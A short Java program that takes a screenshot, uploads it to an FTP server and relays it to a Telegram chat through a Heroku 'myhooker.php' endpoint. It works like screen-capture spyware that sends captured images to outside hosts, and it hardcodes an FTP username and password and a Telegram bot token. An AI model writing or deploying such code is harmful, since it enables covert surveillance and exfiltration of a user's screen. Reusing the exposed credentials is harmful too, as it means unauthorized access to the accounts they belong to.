import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class FtpToTlgrm {
    public static void main(String[] args) throws InterruptedException, IOException {
        File screen = CreateScreen.Create_screen();
        FtpSender.SendFile("ftp-srv63801.ht-systems.ru", "srv63801_dash", "Jg7p73H5", screen.getPath(), "5.png");
        String http ="http://srv63801.ht-test.ru/5.png";
        String httprequest ="http://dwar666.herokuapp.com/myhooker.php?token=891657525:AAF-5Mcr9PNhceswBkDGcE_xi5tgVyZOUPY&method=sendPhoto&chat_id=-1001455789174&photo=";

        String url = httprequest+http;
        URLConnection connection = new URL(url).openConnection();
        InputStream is = connection.getInputStream();
        is.close();
    }
}

